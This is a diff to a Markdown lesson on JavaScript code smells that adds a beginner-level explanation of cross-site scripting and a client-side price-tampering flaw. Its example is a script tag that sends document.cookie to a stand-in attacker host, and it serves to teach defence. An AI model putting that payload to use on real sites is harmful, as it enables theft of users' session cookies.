@@ -284,14 +284,40 @@ for(var i = 0, i < myArray.length; i++) {
 
 You can see the correct way of array iteration being used [here](https://github.com/mcschatz/breakout/blob/cd05e17be5bf83b2b79554f880f8d98038dca41d/lib/game.js#L49)
 
+
+#### Cross-Site Scripting (XSS) Attack Vulnerability
+Cross-site Scripting is when malicious scripts are inserted into the client-side code of a web site or application. You are vulnerable to this kind of attack when you use unvalidated or unencoded user input directly in your site.
+
+Let's say an attacker wants to steal your users cookies (I can't believe that's a real sentence in web development, but anyway... let's assume)
+
+You could do something like that with this line of code:
+
+```
+<script>
+  window.location='http://mysweethackingwebsite98736902/?cookie='+document.cookie
+</script>
+```
+
+Now let's say that in your Blogger app, you take the contents of what someone types in a comment field - store it in the database - and then show it on a page.
+
+Boom. Hacked.
+
+Another example is - maybe you have a store online. Maybe you're selling very expensive t-shirts. Maybe you pull in information like price from the database.
+
+Maybe you then run a sale that takes 10% off of the price and you do your calculation in JavaScript and then change the price on the page.
+
+Maybe then, since you did the calculation in JavaScript, you rely on pulling in the t-shirt's price from the DOM when someone purchases it.
+
+What could go wrong?
+
+![yeezy](http://g.recordit.co/l1xVMiCft7.gif)
+
 __Discussion Points__
 * Did any of the above examples surprise you?
 * How often do you think developers make these kinds of 'mistakes' in production code?
 * How, other than memorizing flash cards, can you prevent potential bugs that you don't know are possible?
 
 ## Additional Code Smells
-
-#### Cross-Site Scripting Vulnerability
 
 #### Breaking the Law of Demeter
 
@@ -307,7 +333,7 @@ __Discussion Points__
 
 Deeply nested if/else statements should be avoided-- they make a program difficult to follow. There are many ways to refactor/restructure to avoid this condition, and good strategy can vary with the situation.
 
-##### 1. Break up into functions.
+#### Breaking Up Functions
 
 Instead of:
 
